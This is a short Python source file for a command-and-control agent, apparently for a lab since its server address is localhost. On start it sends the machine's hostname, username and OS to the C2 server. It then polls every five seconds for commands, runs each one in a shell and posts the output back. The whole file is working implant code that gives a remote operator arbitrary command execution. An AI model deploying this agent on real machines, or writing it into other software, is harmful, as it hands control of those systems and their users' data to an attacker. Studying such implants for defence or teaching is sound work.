
import time
import uuid
import platform
import getpass
import requests
import subprocess

C2_URL = "http://localhost:8000/api"

def register():
    data = {
        "hostname": platform.node(),
        "username": getpass.getuser(),
        "os": platform.system()
    }
    r = requests.post(f"{C2_URL}/register", json=data)
    agent_id = r.json()["agent_id"]
    print(f"[+] Registered as {agent_id}")
    return agent_id

def poll_tasks(agent_id):
    r = requests.get(f"{C2_URL}/tasks/{agent_id}")
    return r.json()

def send_result(agent_id, task_id, result):
    requests.post(f"{C2_URL}/results", json={
        "agent_id": agent_id,
        "task_id": task_id,
        "result": result
    })

def execute_task(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=10)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode()}"
    except Exception as e:
        return str(e)

def main():
    agent_id = register()
    while True:
        tasks = poll_tasks(agent_id)
        for task in tasks:
            print(f"[+] Executing: {task['command']}")
            result = execute_task(task["command"])
            send_result(agent_id, task["task_id"], result)
        time.sleep(5)

if __name__ == "__main__":
    main()
